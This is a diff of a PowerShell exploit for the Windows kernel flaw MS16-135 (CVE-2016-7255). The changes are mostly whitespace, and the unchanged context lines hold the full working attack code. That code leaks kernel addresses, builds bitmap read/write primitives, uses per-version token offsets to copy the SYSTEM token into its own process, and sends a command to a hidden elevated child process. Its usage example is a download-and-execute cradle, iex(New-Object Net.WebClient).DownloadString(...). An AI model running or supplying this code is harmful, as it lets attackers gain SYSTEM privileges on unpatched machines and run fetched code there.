@@ -1,18 +1,18 @@
 function Invoke-MS16135 {
 <#
     .SYNOPSIS
-        
-		PowerShell implementation of MS16-135 (CVE-2016-7255). 
-		Discovered by Neel Mehta and Billy Leonard of Google Threat Analysis Group Feike Hacquebord, Peter Pi and Brooks Li of Trend Micro 
+
+		PowerShell implementation of MS16-135 (CVE-2016-7255).
+		Discovered by Neel Mehta and Billy Leonard of Google Threat Analysis Group Feike Hacquebord, Peter Pi and Brooks Li of Trend Micro
 		Credit for the original PoC : TinySec (@TinySecEx)
 		Credit for the Powershell implementation : Ruben Boonen (@FuzzySec)
-        
+
         Targets:
-        
+
         * Win7-Win10 (x64 only)
-        
+
         Successfully tested on :
-        
+
         * Win7 x64
         * Win8.1 x64
         * Win10 x64
@@ -30,7 +30,7 @@ function Invoke-MS16135 {
         also hides the spawned shell. Many comments have also been removed and echo has
         moved to Write-Verbose. The original can be found at:
             https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1
-        
+
     .EXAMPLE
 
         C:\PS> Invoke-MS16135 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"
@@ -110,25 +110,25 @@ function Invoke-MS16135 {
 			String currentDirectory,
 			ref  STARTUPINFO startupInfo,
 			out PROCESS_INFORMATION processInformation);
-			
+
 		[DllImport("advapi32.dll", SetLastError=true)]
 		public static extern bool SetThreadToken(
 			ref IntPtr Thread,
 			IntPtr Token);
-			
+
 		[DllImport("advapi32.dll", SetLastError=true)]
 		public static extern bool OpenThreadToken(
 			IntPtr ThreadHandle,
 			int DesiredAccess,
 			bool OpenAsSelf,
 			out IntPtr TokenHandle);
-			
+
 		[DllImport("advapi32.dll", SetLastError=true)]
 		public static extern bool OpenProcessToken(
-			IntPtr ProcessHandle, 
+			IntPtr ProcessHandle,
 			int DesiredAccess,
 			ref IntPtr TokenHandle);
-			
+
 		[DllImport("advapi32.dll", SetLastError=true)]
 		public extern static bool DuplicateToken(
 			IntPtr ExistingTokenHandle,
@@ -146,19 +146,19 @@ function Invoke-MS16135 {
 
 		[DllImport("kernel32.dll", SetLastError=true)]
 		public static extern IntPtr GetCurrentThread();
-		
+
 		[DllImport("kernel32.dll", SetLastError=true)]
 		public static extern int GetThreadId(IntPtr hThread);
-		
+
 		[DllImport("kernel32.dll", SetLastError = true)]
 		public static extern int GetProcessIdOfThread(IntPtr handle);
-		
+
 		[DllImport("kernel32.dll",SetLastError=true)]
 		public static extern int SuspendThread(IntPtr hThread);
-		
+
 		[DllImport("kernel32.dll",SetLastError=true)]
 		public static extern int ResumeThread(IntPtr hThread);
-		
+
 		[DllImport("kernel32.dll", SetLastError=true)]
 		public static extern bool TerminateProcess(
 			IntPtr hProcess,
@@ -166,7 +166,7 @@ function Invoke-MS16135 {
 
 		[DllImport("kernel32.dll", SetLastError=true)]
 		public static extern bool CloseHandle(IntPtr hObject);
-		
+
 		[DllImport("kernel32.dll", SetLastError=true)]
 		public static extern bool DuplicateHandle(
 			IntPtr hSourceProcessHandle,
@@ -197,9 +197,9 @@ function Invoke-MS16135 {
 		public IntPtr dwExtraInfo;
 	}
 
-	[StructLayout(LayoutKind.Sequential)] 
-	public struct tagMSG  
-	{  
+	[StructLayout(LayoutKind.Sequential)]
+	public struct tagMSG
+	{
 		public IntPtr hwnd;
 		public UInt32 message;
 		public UIntPtr wParam;
@@ -209,7 +209,7 @@ function Invoke-MS16135 {
 	}
 
 	public struct POINT
-	{  
+	{
 		public Int32 x;
 		public Int32 Y;
 	}
@@ -240,7 +240,7 @@ function Invoke-MS16135 {
 			public string lpszClassName;
 			public IntPtr hIconSm;
 		}
-		
+
 		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
 		static extern System.UInt16 RegisterClassW(
 			[System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass);
@@ -332,8 +332,8 @@ function Invoke-MS16135 {
 
 		[DllImport("user32.dll")]
 		public static extern uint SendInput(
-			uint nInputs, 
-			[In] INPUT pInputs, 
+			uint nInputs,
+			[In] INPUT pInputs,
 			int cbSize);
 
 		[DllImport("gdi32.dll")]
@@ -376,13 +376,13 @@ function Invoke-MS16135 {
 
 #==============================================================[Banner]
 	$ms16135 = @"
-	 _____ _____ ___   ___     ___   ___ ___ 
+	 _____ _____ ___   ___     ___   ___ ___
 	|     |   __|_  | |  _|___|_  | |_  |  _|
 	| | | |__   |_| |_| . |___|_| |_|_  |_  |
 	|_|_|_|_____|_____|___|   |_____|___|___|
-										
+
 	                   [by b33f -> @FuzzySec]
-					   
+
 "@
 	$ms16135
 
@@ -464,9 +464,9 @@ function Invoke-MS16135 {
 		while ($true) {
 			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
 			$SystemInformationLength = New-Object Int
-		
+
 			$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
-			
+
 			if ($CallResult -eq 0xC0000004) {
 				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
 				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
@@ -496,16 +496,16 @@ function Invoke-MS16135 {
 		for ($i=0; $i -lt $HandleCount; $i++){
 			$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
 			$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
-			
+
 			$HashTable = @{
 				ImageName = $Cast.ImageName
 				ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
 				ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
 			}
-			
+
 			$Object = New-Object PSObject -Property $HashTable
 			$SystemModuleArray += $Object
-		
+
 			$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
 		}
 
@@ -536,7 +536,7 @@ function Invoke-MS16135 {
 			[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
 			public static extern IntPtr LoadLibrary(
 				string lpFileName);
-			
+
 			[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
 			public static extern IntPtr GetProcAddress(
 				IntPtr hModule,
@@ -600,7 +600,7 @@ function Invoke-MS16135 {
 				if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
 					Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
 					[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
-					if ($OSMajorMinor -eq "6.1") { 
+					if ($OSMajorMinor -eq "6.1") {
 						$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) # Win7
 					} else {
 						$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) # Win8-10
@@ -678,7 +678,7 @@ function Invoke-MS16135 {
 			}
 			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
 		}
-		
+
 		function Bitmap-Write {
 			param ($Address, $Value)
 			$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
@@ -690,32 +690,32 @@ function Invoke-MS16135 {
 			'10.0' # Win10 / 2k16
 			{
 				$UniqueProcessIdOffset = 0x2e8
-				$TokenOffset = 0x358          
+				$TokenOffset = 0x358
 				$ActiveProcessLinks = 0x2f0
 			}
-		
+
 			'6.3' # Win8.1 / 2k12R2
 			{
 				$UniqueProcessIdOffset = 0x2e0
-				$TokenOffset = 0x348          
+				$TokenOffset = 0x348
 				$ActiveProcessLinks = 0x2e8
 			}
-		
+
 			'6.2' # Win8 / 2k12
 			{
 				$UniqueProcessIdOffset = 0x2e0
-				$TokenOffset = 0x348          
+				$TokenOffset = 0x348
 				$ActiveProcessLinks = 0x2e8
 			}
-		
+
 			'6.1' # Win7 / 2k8R2
 			{
 				$UniqueProcessIdOffset = 0x180
-				$TokenOffset = 0x208          
+				$TokenOffset = 0x208
 				$ActiveProcessLinks = 0x188
 			}
 		}
-		
+
 		Write-Verbose "`n[>] Leaking SYSTEM _EPROCESS.."
 		$SystemModuleArray = Get-LoadedModules
 		$KernelBase = $SystemModuleArray[0].ImageBase
@@ -730,13 +730,13 @@ function Invoke-MS16135 {
 		Write-Verbose "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
 		Write-Verbose "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
 		$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
-		
+
 		Write-Verbose "`n[>] Spawn child"
-		
+
 		$npipeName = Get-Random
 
 		Write-Verbose "`n[>] Choosen name : $npipeName"
-		
+
 		$StartupInfo = New-Object STARTUPINFO
 		$StartupInfo.dwFlags = 0x00000001
 		$StartupInfo.wShowWindow = 0x00000000
@@ -757,14 +757,14 @@ function Invoke-MS16135 {
 		$script:pipeWriter = new-object System.IO.StreamWriter($npipeServer)
 		$pipeWriter.AutoFlush = $true
 		$playerName = $pipeReader.ReadLine()
-		
+
 		if($playerName -eq "ping")
 		{
 			Write-Verbose "[+] Ping from child, voila"
 		}
-		
+
 		Write-Verbose "[+] Child PID is : $("{0}" -f $ProcessInfo.dwProcessId)`n"
-		
+
 		Write-Verbose "`n[>] Leaking current _EPROCESS.."
 		Write-Verbose "[+] Traversing ActiveProcessLinks list"
 		$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
@@ -785,11 +785,11 @@ function Invoke-MS16135 {
 		Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
 
 		"`n[!] Success, spawning a system shell!"
-		
+
 		Write-Verbose "[!] Sending command to the elevated child"
 		$pipeWriter.WriteLine($Command)
-		$npipeServer.Dispose()	
-		
+		$npipeServer.Dispose()
+
 	}
 
 	function Sim-KeyDown {
@@ -802,7 +802,7 @@ function Invoke-MS16135 {
 		$InputObject.itype = 1
 		$InputObject.U = $KeyboardInput
 		$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
-		
+
 		$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
 		if ($CallResult -eq 1) {
 			$true
@@ -816,12 +816,12 @@ function Invoke-MS16135 {
 		$KeyboardInput = New-Object KEYBDINPUT
 		$KeyboardInput.dwFlags = 2
 		$KeyboardInput.wVk = $wKey
-		
+
 		$InputObject = New-Object INPUT
 		$InputObject.itype = 1
 		$InputObject.U = $KeyboardInput
 		$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
-		
+
 		$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
 		if ($CallResult -eq 1) {
 			$true
@@ -935,7 +935,7 @@ function Invoke-MS16135 {
 		$CallResult = [ms16135]::DestroyWindow($hWndChild)
 		$CallResult = [ms16135]::DestroyWindow($hWndParent)
 		$CallResult = [ms16135]::UnregisterClass("cve-2016-7255",[IntPtr]::Zero)
-		
+
 		if ($LoopCount -eq 10) {
 			"`n[!] Bug did not trigger, try again or patched?`n"
 			$Script:BugNotTriggered = 1
